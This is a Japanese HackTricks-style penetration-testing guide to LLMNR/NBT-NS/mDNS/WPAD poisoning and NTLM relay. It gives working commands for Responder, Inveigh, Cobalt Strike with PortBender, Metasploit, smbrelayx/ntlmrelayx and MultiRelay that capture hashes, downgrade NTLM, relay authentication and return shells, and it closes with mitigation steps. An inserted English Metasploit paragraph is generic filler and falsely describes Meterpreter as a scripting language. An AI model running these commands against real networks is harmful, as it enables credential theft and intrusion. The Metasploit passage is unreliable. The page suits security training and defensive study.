# LLMNR、NBT-NS、mDNS/DNS、WPADおよびリレーアタック

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## ネットワークプロトコル

### LLMNR、NBT-NS、およびmDNS

Microsoftシステムでは、DNSの検索が失敗した場合に、リンクローカルマルチキャスト名解決（LLMNR）とNetBIOS名サービス（NBT-NS）を使用して、ローカルホストの解決を行います。Apple BonjourおよびLinuxのゼロ構成実装では、マルチキャストDNS（mDNS）を使用してネットワーク内のシステムを検出します。これらのプロトコルは認証されておらず、UDP上でブロードキャストメッセージを送信するため、攻撃者はこれらを悪意のあるサービスにユーザーを誘導するために悪用することができます。

Responderを使用して、ホストが検索するサービスをなりすますことができます。偽の応答を送信するためにResponderを使用する方法については、[こちら](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)を参照してください。

### WPAD

多くのブラウザは、Web Proxy Auto-Discovery（WPAD）を使用してネットワークからプロキシ設定を読み込みます。WPADサーバーは、次のいずれかで特定のURL（例：_http://wpad.example.org/wpad.dat_）を介してクライアントのプロキシ設定を提供します。

* DHCP（コード252エントリを使用）[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* ローカルドメインで_wpad_ホスト名を検索するDNS
* Microsoft LLMNRおよびNBT-NS（DNSの検索が失敗した場合）

ResponderはWPAD攻撃を自動化します。プロキシを実行し、DHCP、DNS、LLMNR、およびNBT-NSを介してクライアントを悪意のあるWPADサーバーに誘導します。

## プロトコルの改ざん

### Responder - LLMNR、NBT-NS、およびMDNS

> ResponderはLLMNR、NBT-NS、およびMDNSのポイズナーです。名前の接尾辞に基づいて、_特定の_ NBT-NS（NetBIOS名サービス）クエリに応答します（詳細については、[http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)を参照）。デフォルトでは、ツールはSMB用のファイルサーバーサービスリクエストにのみ応答します。
>
> これにより、回答をターゲットにすることができ、ネットワーク上でステルス性を持たせることができます。これにより、正当なNBT-NSの動作を壊さないようにするのにも役立ちます。

* [**Responder**](https://github.com/lgandx/Responder)は、kaliにデフォルトでインストールされており、設定ファイルは\*\*`/etc/responder/Responder.conf` \*\*にあります（ここでローグサーバーを無効にすることができます）
* **Responder**は**ハッシュを画面に表示**し、ホストごとに`/usr/share/responder/logs`ディレクトリにある**ログ**ファイルに書き込みます。ハッシュは`(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`の形式で保存されます。
* **Responder**の**Windows版**は[こちら](https://github.com/lgandx/Responder-Windows)で入手できます。
* Responderは**IPv4**および**IPv6**で動作します。

#### Responderパラメータ

Responderは以下のオプションをサポートしています：
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>Responder Params</summary>

* `-A`フラグは**解析モード**に入り、応答を毒化せずに環境内のNBT-NS、BROWSER、およびLLMNRリクエストを表示できます。
* 必ずインターフェースまたはIPを指定する必要があります。
* `-wf`はWPADローグプロキシサーバーを起動します。
* `-f`はリモートホストのオペレーティングシステムとバージョンを指紋認識しようとします。
* 追加のデータがコンソールに表示されるため、`-v`フラグを使用して冗長性を高めることができます。
* `-F`や`-P`などのオプションを使用すると、NTLM認証や基本認証を強制したり、プロキシ認証を強制したりすることができますが、ログインプロンプトが表示される可能性があるため、注意して使用する必要があります。
* `-w`フラグは組み込みのWPADプロキシサーバーを利用します。これは特に大規模な組織で非常に効果的であり、[Auto-detect settings](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11)が有効になっている場合、Internet Explorerを起動するユーザーのすべてのHTTPリクエストをキャプチャします。

</details>

#### Responderの実行

デフォルトのResponderの動作を実行するには、次のコマンドを実行するだけです。
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
興味深いテクニックは、可能な場合にはレスポンダを使用してNTLM認証をダウングレードすることです。これにより、**NTLMv2ではなくNTLMv1のチャレンジとレスポンス**を**簡単にクラック**することができます[**このガイドに従って**](../../windows-hardening/ntlm/#ntlmv1-attack)**。**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
デフォルトでは、**WPADのなりすましは実行されません**が、次の手順で実行することができます:
```bash
responder -I <Iface> --wpad
```
あなたのIPでNetBIOSリクエストを解決することもできます。そして、**認証プロキシ**を作成します:
```bash
responder.py -I <interface> -Pv
```
NTLMハッシュを傍受することはできませんが（通常はできません）、簡単にいくつかの**NTLMチャレンジとレスポンス**を取得し、たとえば_john_オプション`--format=netntlmv2`を使用して**クラック**することができます。

Kaliのデフォルトの_Responder_インストールの**ログとチャレンジ**は`/usr/share/responder/logs`にあります。

#### Responder - DHCPポイズニング

WindowsはNetBIOS、WINS、WPAD設定など、いくつかのカスタムDHCPオプションを使用しています。ワークステーションがネットワーク設定を取得するためにDHCPリクエストを送信するとき、これらの追加の設定はDHCP応答に含まれ、簡単な接続性と名前解決を容易にします。

DHCP応答のスプーフィングは、ワークステーションのネットワーク構成に干渉するため、中断なしで行うことは困難です。通常、ターゲットサブネットのDNSサーバー、スイッチ、ルーティングテーブル、ドメイン、ネットマスク、DHCPサーバーなどについて非常に良い知識が必要です。これらの設定に誤りがあると、ネットワークに中断が生じます。

ただし、DHCP応答のスプーフィングには独自の利点があります。ARPポイズニングよりも**確実にステルス性があります**。ユニキャスト応答は、被害者のルーティング情報を永久にポイズンするために1つのユニキャスト応答が十分であり、ネットワーク上で複数のDHCPサーバーが動作していることもよくあります。ユニキャストDHCP応答は検出がより複雑であり、一部のスイッチはDHCPスヌーピングを防ぐためのセキュリティ設定を提供していますが、これらの設定は直感的ではなく、有効になっている場合にはしばしば誤って設定されています。

> この攻撃は非常に効果的で、確実にNTLMv1/2ハッシュを提供します。
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - 認証情報のキャプチャ

Responderは、**指定されたプロトコルを使用してすべてのサービスをなりすます**ことができます。これらのプロトコルを使用してサービスにアクセスしようとするユーザーがいる場合、**彼はResponderに対して認証を試み**、Responderは「認証情報」（おそらくNTLMv2のチャレンジ/レスポンス）を**キャプチャ**することができます。

NetNTLMv1へのダウングレードを試みるか、ESSを無効にすることも可能です。

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveighは、Windowsシステムに制限されているペネトレーションテスター/レッドチーム向けのPowerShell ADIDNS/LLMNR/NBNS/mDNS/DNSスプーファーおよび中間者ツールです。

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh)は、PowerShellスクリプトでしたが、現在はC#バイナリとなり、Responderと同じ主な機能を備えています。[**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)には、すべてのパラメータと使用方法の説明がリストされています。\
別のバージョンは[**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)で見つけることができます。

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

または、より多くのオプションを使用して実行することもできます：
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
または、C#バージョンを実行します：
```bash
Inveigh.exe
```
## NTLMリレーアタック

この攻撃は、内部ネットワーク上の**ターゲットマシン**に対して、**SMB認証セッション**をリレーします。認証セッションが**成功した場合**、自動的に**システムのシェル**に移行します。ただし、リレーされる認証は、リレーされたホストに**ローカル管理者アクセス権限を持つユーザー**から行われ、**SMB署名が無効**になっている必要があります。

### 445ポートの転送とトンネリング

{% hint style="warning" %}
ネットワーク内に**マシンを導入**できる場合は、以下のセクションの**ツール**のいずれかを使用してリレーアタックを実行し、これについては心配する必要はありません。
{% endhint %}

ただし、レッドチームでは通常、**Windowsマシンのポート445のトラフィックを自分のマシンに転送**し、次にそのツールのトラフィックを**プロキシを介してルーティング**して内部の攻撃対象マシンに到達する必要があります。

ツール[**PortBender**](https://github.com/praetorian-inc/PortBender)は、ポート**445に向かうトラフィックを別のポート**(たとえば8445)に**リダイレクト**するためのドライバです。ドライバをロードするには、**ローカル管理者**アクセス権限が必要です。ほとんどのWindowsドライバが配置される場所である`cd C:\Windows\System32\drivers`を使用することが合理的です。
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit

Metasploit is a powerful framework used for penetration testing and exploiting vulnerabilities in systems. It provides a wide range of tools and modules that can be used to carry out various hacking techniques. Metasploit allows hackers to identify and exploit vulnerabilities in target systems, gain unauthorized access, and perform post-exploitation activities.

Metasploit is designed to be user-friendly and flexible, making it suitable for both beginners and experienced hackers. It supports multiple platforms and can be used to target various operating systems, applications, and network devices.

The framework includes a comprehensive database of known vulnerabilities, which can be used to search for specific exploits. It also provides a scripting language called "Meterpreter" that allows hackers to automate tasks and create custom exploits.

Metasploit is constantly updated with new exploits and modules, making it a valuable tool for hackers. However, it is important to note that the use of Metasploit for unauthorized activities is illegal and unethical. It should only be used for legitimate purposes, such as penetration testing and securing systems against potential threats.
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx

smbrelayxは、SMBリレーアタックを実行するためのツールです。このツールは、攻撃者が中間者攻撃を使用して、SMBセッションをリレーすることができます。これにより、攻撃者は認証情報を盗み出したり、リモートシステムにアクセスしたりすることができます。

smbrelayxを使用すると、攻撃者は以下の手順で攻撃を実行することができます。

1. 攻撃者は、ターゲットネットワーク内のホストで実行されているSMBサービスを見つけます。
2. 攻撃者は、smbrelayxを使用して、ターゲットホストと攻撃者の間でSMBセッションをリレーします。
3. ターゲットホストは、攻撃者が提供する偽のSMBサーバーに接続しようとします。
4. 攻撃者は、ターゲットホストから送信された認証情報をキャプチャし、リモートシステムにアクセスするために使用することができます。

smbrelayxは、中間者攻撃を実行するための強力なツールですが、悪用される可能性もあるため、正当な目的でのみ使用することが重要です。
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

**MultiRelay**を使用したい場合は、_**/usr/share/responder/tools**_に移動し、MultiRelay (`-t <IP target> -u <User>`)を実行します。
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
![](<../../.gitbook/assets/image (209).png>)

### NTLMログインの強制

Windowsでは、特権アカウントを任意のマシンに認証させることができる場合があります。以下のページを読んで詳細を学びましょう。

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## 解決策

### LLMNRの無効化

DNSクライアントのドメインでLLMNRを無効にするには、gpedit.mscを開きます。\
コンピュータの構成->管理用テンプレート->ネットワーク->DNSクライアントに移動します。\
オプション「マルチキャスト名解決を無効にする」を見つけ、[ポリシー設定]をクリックします。

![](../../.gitbook/assets/1.jpg)

新しいウィンドウが開いたら、このオプションを有効にし、[適用]を押して[OK]をクリックします。

![](../../.gitbook/assets/2.jpg)

### NBT-NSの無効化

NBT-NSを無効にする方法の1つは、DHCPスコープオプションを使用することです。

MicrosoftのDHCPサーバーを使用している場合、NBT-NSを無効にするスコープを選択します。[スコープオプション]を右クリックし、[オプションの構成]をクリックします。以下の例では、NBT-NSを無効にしたいDHCPスコープは192.168.1.100です。

![](../../.gitbook/assets/3.jpg)

スコープオプションウィンドウで、[詳細]タブに移動し、ドロップダウンウィンドウを「Microsoft Windows 2000オプション」に変更します。

![](../../.gitbook/assets/4.jpg)

リストから「001 Microsoft Disable Netbios Option」を選択し、その値を「0x2」に変更し、[適用]、[OK]をクリックします。

![](../../.gitbook/assets/5.jpg)

### WPAD

WPAD攻撃に対抗するために、DNSゾーンに「wpad」のエントリを追加することができます。DNSエントリは有効なWPADサーバーを指す必要はありません。クエリが解決される限り、攻撃は防止されます。

### マルチリレー

1\. **すべてのローカルWindowsマシンでSMB署名を強制する**。この設定により、すべてのSMBセッションにデジタル署名が付けられ、クライアントとサーバーはパケットの送信元を確認してから続行する必要があります。この設定はデフォルトでドメインコントローラーでのみ有効になっています。Microsoftの以下の記事では、これらの設定（グループポリシーを介して有効にできる）とその実装方法について詳しく説明しています。

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **ローカルネットワークのユーザーが必要なマシンにのみリモートログインできるように確認する**。例えば、SallyはSallyのワークステーションにのみログインできるようにします。もし攻撃者がSallyのSMB認証セッションを傍受した場合、セッションを他のワークステーションに中継することはできず、この方法は無効になります。

3\. **ローカルネットワークでのNTLM認証を可能な限り制限する**。この攻撃はKerberos認証を利用することができないため、NTLMの発生量を制限することでこの攻撃を大幅に阻止することができます。Microsoftにはこれを実現するための情報がありますが、注意が必要です。もし何らかの理由でKerberos認証が失敗した場合、通常はNTLMにフォールバックします。完全に無効にすると、ネットワークが停止する可能性があります。

4\. **ネットワーク上の不正なユーザーを防止する**。インサイダーの脅威はおそらくSMBリレーアタックを利用しないでしょう。なぜなら、既にネットワークの資格情報を持っているからです。物理的なセキュリティポリシーを強化し、ACLとMACフィルタリングによってネットワーク上の不正なデバイスを防止し、適切なネットワークセグメンテーションを確保することで、この攻撃の脅威を大幅に制限することができます。

## 参考文献

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **画像の出典:**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[NFT](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/
